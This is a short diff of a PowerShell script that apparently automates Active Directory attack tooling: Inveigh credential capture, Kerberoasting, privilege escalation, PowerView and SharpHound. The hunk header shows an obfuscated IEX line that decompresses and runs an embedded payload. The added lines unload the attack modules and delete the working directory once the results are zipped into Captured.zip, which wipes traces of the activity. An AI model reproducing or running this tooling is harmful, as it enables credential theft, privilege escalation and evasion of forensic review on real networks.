@@ -137,10 +137,16 @@ $PrivEsc='IEX ( nEw-OBJEct sYstEM.iO.StrEaMREAdEr(( nEw-OBJEct iO.coMPRESsioN.dE
 #Zip it all up and remove leftovers
 Stop-Inveigh
 Compress-Archive -Path $path -DestinationPath $zip
+Remove-Module Inv
+Remove-Module Kerberoast
+Remove-Module PrivEsc
+Remove-Module PView
+Remove-Module Sharp
 Remove-Item -Recurse -Force "$modulepath/Inv"
 Remove-Item -Recurse -Force "$modulepath/Kerberoast"
 Remove-Item -Recurse -Force "$modulepath/PrivEsc"
 Remove-Item -Recurse -Force "$modulepath/Sharp"
 Remove-Item -Recurse -Force "$modulepath/PView"
-Remove-Item -Recurse -Force "$modulepath/GPP"							
+Remove-Item -Recurse -Force "$modulepath/GPP"		
+Remove-Item -Recurse -Force $path					
 Write-Host "Done! Results stored in the Captured.zip file!" -ForegroundColor Green
